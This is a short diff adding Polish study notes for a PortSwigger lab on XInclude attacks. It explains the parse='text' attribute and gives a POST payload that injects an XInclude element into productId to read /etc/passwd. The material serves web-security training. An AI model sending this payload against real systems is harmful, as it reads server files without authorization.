@@ -1,0 +1,8 @@
+(https://portswigger.net/web-security/xxe/lab-xinclude-attack)
+
+Domyślnie XInclude spróbuje przeanalizować dołączony dokument jako XML. Ponieważ 
+/etc/passwd nie jest poprawnym kodem XML, będziesz musiał dodać dodatkowy atrybut do dyrektywy XInclude, aby zmienić to zachowanie.
+
+
+[Przyklad wstrzykniecia w metodzie POST]
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
